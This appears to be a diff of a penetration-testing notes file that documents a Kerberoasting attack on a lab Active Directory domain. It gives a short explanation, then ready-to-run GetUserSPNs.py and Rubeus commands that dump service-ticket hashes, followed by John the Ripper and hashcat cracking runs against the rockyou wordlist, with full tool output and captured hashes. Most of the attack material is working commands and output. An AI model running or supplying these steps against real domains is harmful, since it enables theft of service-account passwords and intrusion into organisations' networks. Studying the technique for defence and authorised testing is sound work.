@@ -1,11 +1,22 @@
+Kerberoasting attack
 ========================================================================================
-STEP 1. Kerberoasting using Impacket framework'scripts (Dump TGS_ticket & Obtain Hash)
+
+Kerberoasting abuses traits of the Kerberos protocol to harvest password hashes for Active Directory user accounts with servicePrincipalName (SPN) values (i.e. service accounts). 
+Any domain user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with the RC4 protocol using the password hash of the service account (assigned to the requested SPN) as the key. 
+Thus, an attacker having collected the TGS of all the accounts with servicePrincipalName (SPN) can then attempt an offline brute force attack to obtain the plaintext password of these accounts.
+
+
+========================================================================================
+STEP 1. Perfrom a Kerberoasting attack to collect/dump TGS tikets for SPNs
+========================================================================================
+
+
+Example 1 - Use the Impacket framework script 'GetUserSPNs.py'
 ========================================================================================
 
 jeff@kali:~/Documents/Tools/impacket-master/examples$ GetUserSPNs.py -dc-ip 192.168.1.50 -request security-Test-Lab.local/backup
 
 Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
-
 Password:
 ServicePrincipalName         Name          MemberOf                                                                              PasswordLastSet             LastLogon  Delegation 
 ---------------------------  ------------  ------------------------------------------------------------------------------------  --------------------------  ---------  ----------
@@ -34,14 +45,12 @@ Either GVfs is not correctly installed or GVfs metadata are not supported on thi
 	# Defaults can be restored by simply deleting this file.
 	#
 	# See timesyncd.conf(5) for details.
-
 	[Time]
 	NTP=0.fr.pool.ntp.org
 	#FallbackNTP=0.debian.pool.ntp.org 1.debian.pool.ntp.org 2.debian.pool.ntp.org 3.debian.pool.ntp.org
 	#RootDistanceMaxSec=5
 	#PollIntervalMinSec=32
 	#PollIntervalMaxSec=2048
-
 
 jeff@kali:~/Documents/Tools/impacket-master/examples$ sudo systemctl restart systemd-timesyncd
 
@@ -58,15 +67,46 @@ HTTP/MySecureWebApp:80       760849006SA                                        
 HTTP/MySecureWebsite:443     2835638504SA  CN=AR-gor-distlist,OU=ServiceAccounts,OU=AZR,OU=Stage,DC=Security-Test-Lab,DC=Local   2020-04-15 09:15:12.364142  <never>               
 MSSQLSvc/MySecureSQLdb:1433  1158088162SA  CN=RI-mot-distlist,OU=ServiceAccounts,OU=HRE,OU=Tier 1,DC=Security-Test-Lab,DC=Local  2020-04-15 09:15:16.676472  <never>               
 
-
 $krb5tgs$23$*760849006SA$SECURITY-TEST-LAB.LOCAL$HTTP/MySecureWebApp~80*$8dcfd0fa089d814d86e3643eb09b8433$b2da5cf502f311c634640bb53102d9a5214bb737006897a9070edf0121999797157fa3b98eb866a5ddeaf477d4ac04ebea82d192c51cf5c0b64491a3c3664d5e8d1071d847d3c1936949d3674d2b527f466413b7f91785482ebc9f0f95cb1cad838787b1682589d26d6fc2fd35b3547fef02c0def453571c839e1ac488a74b0b675bb71b989325fd50935f5a440fd8f8479d1c534992e731a17d2a1cdf48a06ca6cecd9dde10698874f7308adffa5787d9764dfb7062c356d9277f9b3b58fc318f824e03ebcfdd67b2db800a530f5dbb7513cac231fec0128e63cdecf8483a7cfc20b4dbc8d59c6666594790b385e092b7a9d59ac02006b6f68b7bf6fc683c83eb344c06225dc53eac11214874c6e33fe8082d05bb456006172430ba7ea5230bd2e941784c2dc1b7ab5e93fadb9d029d91b5363183a0cffc98df16a86726e481d2b56576cc6801fdefcdee409ffd6c21092f39556a869201402f24d46a79238686822d2bfedeb27f263223d3365f3e38f4733d2dbd2281b5cae6b64ba5b424f4569ef8dc29343bb15433fc8dbd20ca9aa7a411072504c17e9e7a834202b9395d88cec59fab9c56f7aae46a11132019f50cb3c22460cc49e0aec528a8d965d0cf5758586dfe8f483d983eed837fb89f42bb862261223dcd4556da17b1f2e62432a43fca879f797904631b55ec487cdda0b72893ed820e1610012c8046eaf05bcb53b7d3f67e40f680b25a2b53518d2582259c33398eb00e5b38c2b091d8eac587e86c137c7a2ebadbf1c00b9d4d8d3e917b8c33c86ce3bac1ce036dc59b9201b94c8ed62630a73a2d90c7130c9749cd8a8bbcf8e8a46b857d45ae90b46babe53f4ea86e8d65b2862106d4af63af7b31481b08b84b9740cdbb10c67f1f028fe9ac3876902b2c522f00b7e249a20d6b10438ef019922e0e5299830fdde555c0282b09837344d1a736697075981ea06e6fb2823d0503d476445a625bebd16ab1a072c7f513d2c263a5be4082e96d4fabd51526f2e1257804d8393ca112966c7e7a6711f791613ee24183ba8fed9b8ac25ee21820b5cde173fe99e51c1242ff80c18821bb139afdde787c459e66729c2ddc95a4a7967f9aba092721956848af64620522b7ff7d3100035c71bfda3f9be4aeede72f4605244bb6b3f17c3f1fa207695c59b53c37b036b45ad4a00888933d9d848e6646d60f0f250769541727cd9a1f2ba1335c29cd7ef59ea127565f069ce12dd0bd3baa5653b52ca4375a8ef0eae92aa157d2a60c22e13edd510d42ff2c019d4236a9c1c6f767a61b9835b934e33d961e4b1f1443800dc68d727bd71314b04f9a19508f91786cf0ed1498b945916f7390deab68cb6ce04f709ae92b8a18dc1cfb0344279c91
 $krb5tgs$23$*2835638504SA$SECURITY-TEST-LAB.LOCAL$HTTP/MySecureWebsite~443*$f09b5c27abf519cd59799a63e57d67f2$39cca739cf0e1bba47322ee2cf6462ecf77767da28465a95557f1eda9412a13d4a6a78188d60f4283997ea53059f79eb5d25901731c3c2bf72db6792d77c3b4e4e6328d62731a144386621102716b37765c6c3547ce5949384ca310f605918f71a4398d34ddf2c9f58469f3acc88201cc92689ef8fa49277d94b0b9e0056b29be8b093c2ecb26fbafeca47bdf21f292de37c5ae7758b883481d0465b35b5570b3c568b9f7569b42b0a9ae417a51ebd24b7f6eaf5b3b5dc3d956fd7bb934a803921a36e2eb8a1564bb7018311c4ae92fa39f4e31c9f4dd9606624137ad8b5b173eb8e56c0d49f1d8d188e2d08077652683bc987abf7109b77df6235e0675a28f196aceed27a1ab59e0b14ce53172d502b4f2e4875aec43703e22eb76e1f4cbc21e099dd590ecf4b6eb9306e0bd298a8246e82343cab60d1b8b37df2ce6e9a6b57bd64586a263c6442b7e9fb7b85f3fc723471d12a1797535790d84722344194aeedd6070b724db66a02a115cda6782c9555dc922fb20b0ce4f88b96b10658a755a80c4f552a27fe49a33f5bee64cb19e7a18081ad091bf0dce90a566a31371e64903fc1d927dc1701a0448683598358e8ad2a5d10ee09148e6c0b38b5c86c5ef7693b1b250ff265c4ffc80fc56998dea263e6a1058e1de394e952a1a530639aa532dd5ee774e304b2eda72c55adb51216bebd71b597da387218990faf3e842fa9c4ed0e6ff354ff7fb814632fd6a3f2e2d63d9c6a03847020c3a76b8faf14b874a9844c8a1a6208932acbfa2a8658139dc7fd6c1d51e1f06395b92fa5b23a9e08f470cdb050a6f85e57bc1c69a3acff253fa7fdf4852867aad30664cc4302b171ee80216e19360284812b7e416cb22fce17a0674fe4bd13f76509ef25d4766488f36778be1e0dcae80f5c2e07ab9fb261cf19b32a985b7ce84abe0426216feedd145497fab011a927de37c5ae87385a4a74a1fc43de27d7a2c7afe0d8d498e86a2664824955bcfe7c9f000ee6df7787a30e04841e9e167c26643a16676d2b2b0911b11f01ebe42096550a06dfb7454f33913ef7391a9371177513be971202df93e2aff80a8367746d4e0d832274b7de0f28fee83c88af0aa5c6c5c73e599493f944badc312cd93e618aac91db48aa5455cdb0a8c88efb33006475a0a9f166e711adb82931f95f1f77cb9db4e5444d5c79ff8590790132c59ec6d6fe8d6cddba32f3637a59f794efc8c419362ae682414acb744d1e45be0486bba87f823d808a9dd4472ccba9e5d394b5932edd71a43519261fee1decabb2265b8697f8932f20db3377ea9978ab2c36f79ab2fa8467fc8ebfc792cc0d576443e316d4cfe8adddea624f7c0d9b494de961d060af79584ab8475255899ef4
 $krb5tgs$23$*1158088162SA$SECURITY-TEST-LAB.LOCAL$MSSQLSvc/MySecureSQLdb~1433*$95b07a748d4cfd314d719f78283a2d73$316a787f62872366ae441da925c281152c7d8ae36fad216cf89071d4501e82058efa2d1ebe1e323eeabc8c8b4a4966cd709e009fa60806599b7d15fe8368e4f83be83179c764dfa4de302062d41298d38d3816ee11ff8db90ebdd357b91ba184b724841068a8792261ac84cac2f3e84e6fae7c72d99fe990ae15b7de8688d78708cf204e55ff0f91773a80676ab329bc0d93577005001c6ba25f9f4c84484c3178ee504a05ef99634334699b2e95c1b4c9b5ec704d920c0907a5ccb2a3495b7b03167252c4894ea3292400e67c41c0ebb453c2a149f28bd25965e70cc7062b5299041e9ae0ad48473044f13b1a58d9daa9bc4a8d4915e59dccd52d4d17babcdeddd8ebacee01020c7d20a78acf9642de579c28305b0e6892c47f9f123027e9023bef399b740974163fe4bd0db4429981652986f596351f031f22efab471f0662421f764dc3c0c759ccff2a25eadc0d9936cb80f89dcadb600b69c5fedb86033da1657553cf703f6f77f52cd4790c9f4974a6a9006868621fdf050f5b029cf07e5763fd729f6d410957d7064e1a3dc9049160de73910a977780e4db3bb718c2e66bed1148a60b44c0fcd9b27d791a1cf43f80ea9faab7309432ffc1e1487aab63d0ae2d06760a79080ce9ee8713016fc7dbd65c351125403396a345443bbe8aa3040a99ec38b0f9eeffb4084241ad8fac4cc8f21ee14ddd0d7692514acaae80543b0f9a86e6e4aea74eaa56422ee7b459411357b280ec27414204b826bcf18a3a84993b53b9d1a5c43aedda74a32c5aad057ed8f4a4c5fdded8e762fb6f675e768b6618551ac8d43713b624ec96cfae666e501e94a9bf32c2da84aa7ded7233cb7dff14c525f799a94fcf21d02b9c8d89e13f4e6c4f042921b1c6c504e611f1df66f710e94b75ddb79d5d55fa6fefb6fdcaf2113e37fb16dbd4edc7075564a600c457004e4451b2820d88f7ed4c0afa7b4db2fa64e58804888ae9f34c5256e104e8768440a143e2c04b76a50312b38772b316c3cadf155433fcf763ab0af5e41a1f1b15c8e64ca0162cdafee511cedee2ac7e3fa0a354be2747aec029a011f17d159ce07a724190b28356259933222a13fc190e5d56150670ec5b4a8c7a87ac37d2c5479f47881c3218e02108630adaa568578c8e3f8b26d8e89449758d1803fc7c2bd6570a8e5e5d077212cc5a733c6b191bee7dccf2d9027bb853c0f31c6bf4aa5461fd1932a52c534e95ddf2cfb3135b9596f41c9b4344dc83ddc8d340f3f1aff89a202204e62fe0e07404dbde09d354af28d5239421ed87c6526d0f78d2ff321cebfff119f90347deb308fc8a2fb1c6b792f262a07f1cf13aeba8c5f4a4cc17b797354272105fcc6c8c4ee034bfc9b4f73a6edc5e
 
 
+
+Example 2 - Use the tool RUBEUS
+========================================================================================
+
+C:\AD\jfc-tools>Rubeus.exe kerberoast /dc:192.168.1.50 /domain:security-Test-Lab.local
+or
+C:\AD\jfc-tools>Rubeus.exe kerberoast /nowrap
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Kerberoasting
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Searching the current domain for Kerberoastable users
+[*] Total kerberoastable users : 3
+
+
+[*] SamAccountName         : MySecureWebApp2
+[*] DistinguishedName      : CN=MySecureWebApp2,CN=Users,DC=SECURITY-TEST-LAB,DC=local
+[*] ServicePrincipalName   : HTTP/Webserver.SECURITY-TEST-LAB.LOCAL
+[*] PwdLastSet             : 2/17/2019 1:01:06 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*MySecureWebApp2$SECURITY-TEST-LAB.LOCAL$HTTP/Webserver.SECURITY-TEST-LAB.LOCAL*$5234BC49352723E133D4DCFFEA436B8F$67AD9CFBD3028048E804E72C36E0B325C29FEB3BBCB8E014BAFFFE30D7C765CC0E9784040C7BF69ABE81849F1AE9EFDE88649BC6599E3D718456D3C2CB5860F996A4999B5189ABCC8A84159EA81FBC1F99C8157BDD12E5EFAF706AFD7042FBC8CB0B1F6120B45B455E4B8469B3BFB755BDE3DB2C4C04E72FBCD34020B46821375BED6CC7B135611E14F6FE71414AB7919235314B3CB15694CCEDCB2FDF2FE7C08A157171F97EBF95C390ABB9CD1E7153826699AD1C1F42BB349B8260CA7E47BD20291D31C3892F3F2E9F79309BF1960B5B2D3AC2EAE14ADBA6B8994E8D7E34AD24CAD0A9C42C5142093BB0A6B7CBAD220B19B73BE59E7ADF720FAC6F11216BE13DB3FAE2C0ECB77EB15134B499A4E84CE747CC35D77072AF8B1998809399B3E6FA18F17B068FD336A485ACD59AA1AC4443C4CB94B9B7E29A52AC66535F948830E3113DB5CB9221D68F2FD0D12911DD94BC4F1C9DDE24E810BFEBA672336EFF14222E73461B716E5588C839B93F3B91E9232E7D5358737F351345F5AAA0B61CF3E4BDA233F487F6198FC6B936DA7ED2CCC8ACC209EF124E2A3AD5AF1E9AEDEF790B47B453A03029B19DCD9A79F9898BEE9CA24727F712AEB95E05719EFADB1EECFC98EEC12212A54C20B502316A363249A44713CBCC3441E384B13DA59FA0AF7360D5BE36074A36A5E56A238AC311D6A74593D27F7F2BF279516317D7E566F8F165733A5486E2FB9CE25A209CEC010F27B8E53BE1D3EF77245706EEAD38833AE5EC343ADD3B72D357EE6B27F87E9F3466F8509AFBA60069E3DF63F1CFF8DE93326A00444507BACD44FA4EF80A1184A2C727B3154E64A88D065394A8EB361E1CE5B1FFF096D317B03F80180BF7BA6B731517C050C481F3A742342FE65D11C8E9675ABF9C8C05B8FAE3DEEDE87711ABE5D1D4951522D2A22EEE7418733DDFBC81A54CF2900618486ADFBDCFA01B0EE13BB60D3F036D2F614A606A5162EB21333BD1AE572B1366833FFE289F93E3CC628AFEB380E5F3C097435A411B046BBACAE03FBB32F45D5AE17443F01A4A41330545692585F9915B2EBDB87F0E4BD634538210A4699B3258894CA7FE5933F4B5025DFBF0407251B7144C82D251AD2ACF0A042408411C9F3F2E2797D6916109302B487DFBD849303FAEACCF7D370E823E56BAACE87A04F3CF44EE3D08CDDACD13C88B895AD831B68EB3E32546B1C3F1E0803AC7CF88A2662324A027C9A0AB835A5EFEEC29D9F9452CEAA3EE95F9596624D712F0175F55574AD4B5025BCE0B2462F6F0976BFC12C6A5C54B03245ECD29220B1DA69041B9037EBB3B19AA2E2AA438F571B9C353D0717919F3ADF1543252A349B7EC7EE8EB02B6D5CA0C24FE222E63218D2BD906939C8DADBFF5FB2380C19E787D81F28E01ADC56CD2080A347971433832AB3D088B2FE75B4AA2782D054A31300858A499EA4B7716CB346698405CBFA01653AB43867426F68C22807CD56A54FD905704C7BCCC672EF313EC2186C21F3355C5E7BED7479CAF0830E46F34B7B7912B5944A09CA633DF2052D4C1F949EB1BBE18FA21B2D7AE76CB755A05C04A1C43F9F7C184A03E8A42B75816EF1E52211CAB3CC5295C859289E2F6858FF3723F3E89
+<SNIP>
+
+
 Other methods / Tools
------------------------------------------------------------------------------
-=> Rubeus
+========================================================================================
 => Invoke-Kerberoast.ps1
 => Mimikatz
 => Empire
@@ -74,79 +114,18 @@ Other methods / Tools
 Useful link: https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/
 
 
-============================================================================
+========================================================================================
 STEP 2. Recover the Windows password of the service accounts with an SPN
-============================================================================
-
-=> HASHCAT
--------------
-
-jeff@kali:~/Documents/CTFs/BadBlood$ sudo hashcat -m 13100 -a 0 Kerberoast-attack-TGT-hashes.txt /usr/share/wordlists/rockyou.txt --force
-
-hashcat (v5.1.0) starting...
-
-OpenCL Platform #1: The pocl project
-====================================
-* Device #1: pthread-Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, 512/1493 MB allocatable, 2MCU
-
-Hashes: 3 digests; 3 unique digests, 3 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Applicable optimizers:
-* Zero-Byte
-* Not-Iterated
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-
-ATTENTION! Pure (unoptimized) OpenCL kernels selected.
-This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
-If you want to switch to optimized OpenCL kernels, append -O to your commandline.
-
-Watchdog: Hardware monitoring interface not found on your system.
-Watchdog: Temperature abort trigger disabled.
-
-* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'                                                                                                                                  
-* Device #1: Kernel m13100_a0-pure.837c174d.kernel not found in cache! Building may take a while...
-Dictionary cache built:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344392
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-* Runtime...: 2 secs
-
-[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
+========================================================================================
 
 
-Session..........: hashcat
-Status...........: Running
-Hash.Type........: Kerberos 5 TGS-REP etype 23
-Hash.Target......: Kerberoast-attack-TGT-hashes.txt
-Time.Started.....: Wed Apr 15 17:07:02 2020 (29 secs)
-Time.Estimated...: Wed Apr 15 17:08:10 2020 (39 secs)
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:   629.2 kH/s (10.96ms) @ Accel:64 Loops:1 Thr:64 Vec:8
-Recovered........: 0/3 (0.00%) Digests, 0/3 (0.00%) Salts
-Progress.........: 17915904/43033155 (41.63%)
-Rejected.........: 0/17915904 (0.00%)
-Restore.Point....: 5971968/14344385 (41.63%)
-Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
-Candidates.#1....: luvkiss1 -> lushikun
+Exemple 1 - Using the tool 'John The Ripper'
+========================================================================================
 
-[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
-<SNIP>
+JTR command to use for the output of 'GetuserSPN.py'
+----------------------------------------------------------
 
-
-jeff@kali:~/Documents/CTFs/BadBlood$ sudo hashcat -m 13100 -a 0 Kerberoast-attack-TGT-hashes.txt --show
-
-
-
-=> John The Ripper
--------------------
-	
-jeff@kali:~/Documents/CTFs/BadBlood$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt Kerberoast-attack-TGT-hashes.txt 
+> jeff@kali:~/Documents/CTFs/BadBlood$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt Kerberoast-attack-TGT-hashes.txt 
 
 Using default input encoding: UTF-8
 Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
@@ -156,9 +135,89 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 <SNIP>
 
 
+JTR command to use for the output of 'RUBEUS'
+----------------------------------------------------------
 
-jeff@kali:~/Documents/CTFs/BadBlood$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt Kerberoast-attack-TGT-hashes.txt --show
+> C:\Users\Administrator\Documents\Tools-AD\john-1.9.0-jumbo-1-win64\run>john --format=krb5tgs Kerberoast-pwd-hashes-hashcat.txt --wordlist=rockyou.txt --rules=all
+
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:06:16 0.00% (ETA: 2022-03-23 15:26) 0g/s 393677p/s 1181Kc/s 1181KC/s LovedLoved..LobsterLobster
+0g 0:00:07:35 0.00% (ETA: 2022-05-26 10:50) 0g/s 412419p/s 1237Kc/s 1237KC/s Achilles2achilles2..Yellow00yellow00
+0g 0:00:07:52 0.00% (ETA: 2022-05-31 20:32) 0g/s 419529p/s 1258Kc/s 1258KC/s hegce..hachi
+0g 0:00:09:00 0.00% (ETA: 2022-07-10 22:30) 0g/s 427341p/s 1282Kc/s 1282KC/s Hatzugay23Hatzugay23..Hateme66Hateme66
+0g 0:00:15:06 0.00% (ETA: 2022-07-18 13:47) 0g/s 443169p/s 1329Kc/s 1329KC/s x2234..igi77
+0g 0:00:24:36 0.00% (ETA: 2023-01-22 03:42) 0g/s 487925p/s 1463Kc/s 1463KC/s 09282674680k..09275962761k
+0g 0:00:57:27 0.00% (ETA: 2024-02-09 07:53) 0g/s 535630p/s 1607Kc/s 1607KC/s Bubbles1357)..Bubba151)
+0g 0:00:57:28 0.00% (ETA: 2024-02-09 06:48) 0g/s 535767p/s 1607Kc/s 1607KC/s Wriuxl8)..Willow01)
+<SNIP>
 
 
+Exemple 2 - Using the tool 'HASHCAT'
+========================================================================================
 
+JTR command to use for the output of 'GetuserSPN.py'
+---------------------------------------------------------
+
+jeff@kali:~/Documents/CTFs/BadBlood$ sudo hashcat -m 13100 -a 0 Kerberoast-attack-TGT-hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+	hashcat (v5.1.0) starting...
+
+	OpenCL Platform #1: The pocl project
+	====================================
+	* Device #1: pthread-Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, 512/1493 MB allocatable, 2MCU
+
+	Hashes: 3 digests; 3 unique digests, 3 unique salts
+	Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+	Rules: 1
+
+	Applicable optimizers:
+	* Zero-Byte
+	* Not-Iterated
+
+	Minimum password length supported by kernel: 0
+	Maximum password length supported by kernel: 256
+
+	ATTENTION! Pure (unoptimized) OpenCL kernels selected.
+	This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+	If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+	Watchdog: Hardware monitoring interface not found on your system.
+	Watchdog: Temperature abort trigger disabled.
+
+	* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'                                                                                                                                  
+	* Device #1: Kernel m13100_a0-pure.837c174d.kernel not found in cache! Building may take a while...
+	Dictionary cache built:
+	* Filename..: /usr/share/wordlists/rockyou.txt
+	* Passwords.: 14344392
+	* Bytes.....: 139921507
+	* Keyspace..: 14344385
+	* Runtime...: 2 secs
+
+	[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
+
+
+	Session..........: hashcat
+	Status...........: Running
+	Hash.Type........: Kerberos 5 TGS-REP etype 23
+	Hash.Target......: Kerberoast-attack-TGT-hashes.txt
+	Time.Started.....: Wed Apr 15 17:07:02 2020 (29 secs)
+	Time.Estimated...: Wed Apr 15 17:08:10 2020 (39 secs)
+	Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+	Guess.Queue......: 1/1 (100.00%)
+	Speed.#1.........:   629.2 kH/s (10.96ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+	Recovered........: 0/3 (0.00%) Digests, 0/3 (0.00%) Salts
+	Progress.........: 17915904/43033155 (41.63%)
+	Rejected.........: 0/17915904 (0.00%)
+	Restore.Point....: 5971968/14344385 (41.63%)
+	Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
+	Candidates.#1....: luvkiss1 -> lushikun
+
+	[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
+	<SNIP>
+
+
+jeff@kali:~/Documents/CTFs/BadBlood$ sudo hashcat -m 13100 -a 0 Kerberoast-attack-TGT-hashes.txt --show
 
